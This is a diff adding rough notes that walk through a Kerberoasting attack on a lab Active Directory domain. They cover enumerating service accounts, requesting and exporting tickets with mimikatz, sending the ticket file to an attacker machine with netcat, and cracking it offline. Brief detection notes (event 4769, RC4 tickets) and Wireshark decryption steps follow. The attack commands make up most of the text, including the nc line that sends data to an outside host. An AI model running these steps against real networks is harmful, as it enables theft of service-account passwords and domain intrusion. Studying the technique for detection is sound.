@@ -1,0 +1,77 @@
+Attack that allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account (i.e account used for running an IIS service) and crack them offline avoiding AD account lockouts.
+
+
+Execution ::
+
+ a user account with servicePrincipalName attribute set, which is very important piece for kerberoasting 
+ 
+ Attacker setting up an nc listener to receive a hash for cracking:
+ nc -lvp 443 > kerberoast.bin
+ 
+ 
+Extracting the Ticket ::
+ 
+ Attacker enumerating user accounts with serverPrincipalName attribute set:
+ Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+ 
+ Using only built-in powershell, we can extract the susceptible accounts with:
+ get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
+ or 
+ get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
+ 
+ 
+ Additionally, user accounts with SPN set could be extracted with a native windows binary:
+  setspn -T offense -Q */*
+  
+  
+Attacker requesting a kerberos ticket (TGS) for a user account with servicePrincipalName set to HTTP/dc-mantvydas.offense.local- it gets stored in the memory:
+Add-Type -AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
+
+
+Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:
+mimikatz # kerberos::list /export
+
+
+Attacker sends the exported service ticket to attacking machine for offline cracking:
+nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
+
+
+
+Cracking the Ticket ::
+
+Attacker brute forces the password of the service ticket:
+python2 tgsrepcrack.py pwd kerberoast.bin
+
+
+Observations :::
+
+If you see Add-event -AssemblyName SystemIdentityModel (from advanced Powershell logging) followed by a windows security event 4769 immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption type has a value 0x17 (23 decimal, meaning it's RC4 encrypted):
+
+
+Traffic:::
+
+protocol = KRBS
+ request being sent to the Ticket Granting Service (TGS) for the service with a servicePrincipalName 
+TGS-REQ
+
+
+Creating a kerberos keytab file for use in wireshark:
+for decrypt thatbtrafic
+root@~# ktutil 
+ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
+Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
+ktutil:  wkt /root/tools/iis.keytab
+encryption form the wireshark
+
+
+Adding the keytab to wireshark:
+wireshark - preferenes - profile
+
+
+
+Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service 
+
+
+online cracker  
+Creating a kerberos keytab file for use in wireshark:
